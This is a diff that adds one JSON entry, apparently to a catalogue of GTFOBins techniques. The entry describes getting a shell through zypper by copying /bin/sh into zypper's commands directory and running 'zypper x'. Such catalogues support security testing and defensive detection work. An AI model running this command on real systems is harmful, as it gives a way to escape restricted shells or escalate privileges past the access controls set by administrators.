@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-zypper-shell-1",
+  "name": "GTFOBins · zypper (shell) #1",
+  "command": "cp /bin/sh /usr/lib/zypper/commands/zypper-x\nzypper x",
+  "description": "Use zypper to shell via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "zypper",
+    "shell"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/zypper/#shell",
+  "upstream_id": "zypper/shell/0",
+  "category": "gtfobins",
+  "subcategory": "shell",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/zypper/"
+    }
+  ]
+}
